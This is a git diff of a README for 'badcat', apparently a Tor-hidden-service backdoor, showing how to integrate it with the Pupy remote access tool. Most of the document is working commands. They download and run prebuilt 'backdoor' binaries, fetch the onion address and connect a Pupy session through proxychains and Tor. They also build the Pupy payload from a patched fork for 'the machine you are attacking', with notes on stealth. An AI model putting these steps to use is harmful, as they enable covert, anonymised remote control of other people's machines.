@@ -1,4 +1,4 @@
-# Pupy
+# Pupy - Proof of Concept
 
 Badcat is a reasonably good tool, but one generally needs to perform many actions through a backdoor, then using badcat as-is will eventually get you into issues. For instance, one needs to perform an upload or download of files, badcat can't help you with that.
 
@@ -10,7 +10,7 @@ I chose pupy, among other reasons, because I failed to make it work with others 
 
 _What works for now?_
 
-**R: Linux only. Every RPC related stuff from Pupy works out of the box. Pupy process hidding is broken for now, so when you run the program it keeps in the foreground - this details matters when you want to be stealth, but for now just ignore it.**
+**R: This is a Proof of Concept and works in Linux only. Every RPC related stuff from Pupy works out of the box. Pupy process migration is disabled for now, so when you run the program it keeps in the foreground and in the same process - this details matters when you want to be stealth, but for now just ignore it.**
 
 _Will it work on my machine?_
 
@@ -18,7 +18,7 @@ _Will it work on my machine?_
 
 _I don't care about how everything works, can't I just test it out?_
 
-**R: Of course you can. Follow this [steps](). Although I always recommend to take a look to understand what is going on under the hood.**
+**R: Of course you can. Follow this [steps](#quick-start). Although I always recommend to take a look to understand what is going on under the hood.**
 
 _Will badcat work with any other RAT?_
 
@@ -32,11 +32,105 @@ _I hate your integration design choices, can I help you?_
 
 **R: Why haven't you told me before? Of course you can. Fill up an Issue or send a Pull Request. I'm terrible at coding and do not know how it worked, it just works.**
 
-# Integration
+# Quick Start
 
-## Steps
+You just want to test to see if it works, I get it. So each step will not contain many explainations.
 
-### 1. Clone Pupy
+## 1. Clone Pupy
+
+Clone the project recursively (as stated [here](https://github.com/n1nj4sec/pupy/wiki/Installation#pupy-setup)).
+
+```bash
+git clone --recursive https://github.com/yanmarques/pupy.git
+```
+
+## 2. Run the Simulation Environment
+
+I only tested with this container, so proceed as following: 
+
+```bash
+cd ./pupy/
+podman build -t pupy-local -f ./client/Dockerfile .
+podman run -it pupy-local bash 
+```
+
+The above commands will leave you inside an interactive shell inside the container.
+
+## 3. Download and Run Pre-Built Binaries in the Container
+
+I gently provided pre-built binaries, the `backdoor` executable and badcat shared library. **Inside the container**, download them with:
+
+```bash
+wget https://github.com/yanmarques/badcat/raw/dev/test-pupy/resources/backdoor
+wget https://github.com/yanmarques/badcat/raw/dev/test-pupy/resources/libbadcat_pupy.so
+```
+
+Then run the _backdoor_ with:
+
+```bash
+LD_LIBRARY_PATH=. ./backdoor
+```
+
+Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generated Onion Service hostname, discover the container ID then run the following command:
+
+```bash
+podman exec CONTAINER_ID cat hidden-service/hostname
+```
+
+The output should be an onion address, I'll use the following address as example `ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion`.
+
+**The next steps are executed in your machine, not the container. The container just run the _backdoor_.** 
+
+## 4. Install Pupy Python 2.7 Deps
+
+Ensure Pip is installed for your Python 2.7 with:
+
+```bash
+wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+python2 get-pip.py
+```
+
+Then install `swig`:
+
+```bash
+dnf install -y swig
+```
+
+Finally install Python dependencies:
+
+```bash
+cd ./pupy/pupy
+python2 -m pip install -r requirements.txt
+```
+
+## 3. Spawn a Session to Pupy
+
+Now you connect to the server through Tor. Follow [this](https://itigic.com/use-proxychains-and-tor-on-linux-to-be-anonymous/) article to have Tor and `proxychains` installed and configured. Then run the following command to start Pupy shell:
+
+```bash
+cd ./pupy/pupy
+proxychains python2 pupysh.py
+```
+
+A prompt will be displayed. Type the connect command like the following replacing the onion address with the one you discovered earlier (yes, use the hardcoded port 8000):
+
+```bash
+>> connect -c ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion:8000 -t tcp_cleartext
+```
+
+Now be patient! 
+
+Generally it take around a minute to start a full session, it depends on your connection, Tor's network latency at the moment and so on. For me it has already took more than five minutes to start a full session. So again, be patient.
+
+Once the full session has started, one may see the following:
+
+![Pupy shell connection from badcat integration](https://user-images.githubusercontent.com/28604565/148860949-71ab11ee-3d91-4342-82c6-ac96d5d75077.png)
+
+# Build From Source
+
+For my own anottation purpose and for the ones looking for how to build all tools from source, the next steps describes the how to.
+
+## 1. Clone Pupy
 
 The official Pupy project can not run badcat without modification in the Linux client source code. So I fork the official project and make the necessary changes. My fork is [here](https://github.com/yanmarques/pupy), I recommend you to check the latest commits to see what are such modifications.
 
@@ -46,7 +140,7 @@ That being said, clone the project recursively (as stated [here](https://github.
 git clone --recursive https://github.com/yanmarques/pupy.git
 ```
 
-### 2. Build The Container Image
+## 2. Build The Container Image
 
 Unfortunately, again, the official Pupy container image has a different `libc` version than the machine I used to build badcat integration code. Either I build badcat integration code in another machine or container, or re-create Pupy official container with the required `libc` version. I chose the later because I would have more control over the environment.
 
@@ -57,7 +151,7 @@ cd ./pupy/
 docker build -t pupy-local -f ./client/Dockerfile . 
 ```
 
-### 3. Install Pupy Python 2.7 Deps
+## 3. Install Pupy Python 2.7 Deps
 
 Pupy relies on Python 2.7 yet, so one must have such package installed. In order to install dependencies, ensure Pip is installed for your Python 2.7. One can install Pip with:
 
@@ -79,7 +173,7 @@ cd ./pupy/pupy
 python2 -m pip install -r requirements.txt
 ```
 
-### 4. Build Badcat's Pupy Integration
+## 4. Build Badcat's Pupy Integration
 
 First, follow badcat toolchain installation [here](https://github.com/yanmarques/badcat/tree/dev#getting-started) if you have not installed before. Then make sure you are at the `dev` branch and fully updated:
 
@@ -110,7 +204,7 @@ This ELF shared library file is extremely important, it holds Tor and badcat cod
 
 Sooo, copy the `libbadcat_pupy.so` shared library to `pupy/client/sources-linux`.
 
-### 5. Build Pupy Linux Executable
+## 5. Build Pupy Linux Executable
 
 In order to generate the required executables, change your current working directory to the top level directory of Pupy project (`pupy`). Then run (if you use docker, just replace `podman` with `docker`):
 
@@ -126,7 +220,7 @@ It take some time to finish, but as soon as it has finished, one should see a `[
 cp ./pupy/payload_templates/pupy.lin ./pupy/payload_templates/pupyx64.lin
 ```
 
-### 6. Build the Pupy Payload
+## 6. Build the Pupy Payload
 
 In order to generate the resulting executable with the payload, change your current working directory to the pupy source (`pupy/pupy`). Then enter inside the Pupy shell with the following command:
 
@@ -146,7 +240,7 @@ Finally, build the payload:
 
 The resulting executable is at `./pupy/pupy/backdoor`. To fully test Pupy with badcat functionality, you need this `backdoor` executable, the integration shared library and the Pupy shell of course.
 
-### 7. Start a Pupy Session with badcat
+## 7. Start a Pupy Session with badcat
 
 First things first, prepare the machine you are attacking. This machine must have some weird libraries installed, with boring versions. So the best way I found was to use the container image, the one created early under the name of `pupy-local`, derived from a Dockerfile I wrote myself.
 
